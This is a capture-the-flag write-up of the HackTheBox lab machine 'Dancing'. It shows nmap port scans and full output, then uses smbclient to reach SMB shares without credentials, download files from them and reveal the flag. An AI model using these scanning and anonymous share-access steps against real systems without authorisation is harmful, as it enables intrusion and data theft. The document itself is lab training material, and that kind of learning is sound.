---
title: "HTB - Starting Point: Dancing"
date: 2022-05-21
---

Dancing is part of the Starting Point series in HackTheBox, and it is our first Windows machine, allowing us to take a closer look at the SMB protocol.

## Box Information

| **Name:** | **Dancing** |
|-----------|----------|
| OS:       | Windows    |
| Difficulty:| Very Easy |


## Recon

### nmap
`nmap` finds a lot of open ports. The most interesting one is the SMB port (445), running microsoft-ds.
```
┌──kali@kali$ nmap -p- --min-rate 10000 10.129.96.109
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 16:41 EDT
Warning: 10.129.96.109 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.96.109
Host is up (0.14s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
5985/tcp  open     wsman
17654/tcp filtered unknown
33973/tcp filtered unknown
35011/tcp filtered unknown
43958/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
53968/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```

```
┌──kali@kali$ nmap -p 135,139,445,1668,5985,22540,30134,47001,47852,49664,49665,49666,49667,49668,49669 -sCV 10.129.96.109
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 16:44 EDT
Nmap scan report for 10.129.96.109
Host is up (0.15s latency).

PORT      STATE  SERVICE       VERSION
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
1668/tcp  closed netview-aix-8
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
22540/tcp closed unknown
30134/tcp closed unknown
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47852/tcp closed unknown
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-22T00:45:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.48 seconds
```

## SMB
We can list the SMB shares using `smbclient`, getting the following:
```
┌──kali@kali$ smbclient -N -L \\\\10.129.96.109

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.96.109 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

And we can connect to `WorkShares`, using:
```
┌──kali@kali$ smbclient -N \\\\10.129.96.109\\WorkShares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1728545 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1728545 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

		5114111 blocks of size 4096. 1748400 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\>
```

Getting our flag
```
┌──kali@kali$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```
